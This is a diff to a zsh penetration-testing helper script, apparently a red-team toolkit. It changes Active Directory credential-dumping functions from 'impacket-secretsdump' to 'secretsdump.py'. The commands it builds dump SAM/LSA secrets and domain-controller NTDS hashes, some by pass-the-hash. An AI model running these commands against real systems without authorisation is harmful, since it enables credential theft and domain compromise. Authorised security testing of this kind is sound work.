@@ -36,7 +36,7 @@ nb-ad-dump-secrets-local() {
     __ask "Select a SYSTEM.save file"
     local sys && __askpath sys FILE $(pwd)
 
-    print -z "impacket-secretsdump -sam $sam -security $sec -system $sys LOCAL"
+    print -z "secretsdump.py -sam $sam -security $sec -system $sys LOCAL"
 }
 
 nb-ad-dump-install() {
@@ -60,12 +60,12 @@ nb-ad-dump-secrets() {
         echo
         __ask "Enter a password for authentication"
         nb-vars-set-pass
-        print -z "impacket-secretsdump ${__DOMAIN}/${__USER}:'${__PASS}'@${__RHOST} | tee ${__hostpath}/${__USER}-hashdump.txt"
+        print -z "secretsdump.py ${__DOMAIN}/${__USER}:'${__PASS}'@${__RHOST} | tee ${__hostpath}/${__USER}-hashdump.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter THE WHOLE NT:LM hash for authentication"
         __check-hash
-        print -z "impacket-secretsdump ${__USER}@${__RHOST} -hashes '${__HASH}' | tee ${__hostpath}/${__USER}-hashdump.txt"
+        print -z "secretsdump.py ${__USER}@${__RHOST} -hashes '${__HASH}' | tee ${__hostpath}/${__USER}-hashdump.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -90,12 +90,12 @@ nb-ad-dump-ntds() {
         echo
         __ask "Enter a domain admin password for authentication"
         nb-vars-set-pass
-        print -z "impacket-secretsdump ${__DOMAIN}/${__USER}:'${__PASS}'@${__DCHOST} -just-dc-ntlm | tee $(__dcpath)/NTDS-hashdump.txt"
+        print -z "secretsdump.py ${__DOMAIN}/${__USER}:'${__PASS}'@${__DCHOST} -just-dc-ntlm | tee $(__dcpath)/NTDS-hashdump.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the domain admin NTLM hash for authentication"
         nb-vars-set-pass
-        print -z "impacket-secretsdump ${__USER}@${__DCHOST} -hashes '${__HASH}' -just-dc-ntlm | tee $(__dcpath)/NTDS-hashdump.txt"
+        print -z "secretsdump.py ${__USER}@${__DCHOST} -hashes '${__HASH}' -just-dc-ntlm | tee $(__dcpath)/NTDS-hashdump.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
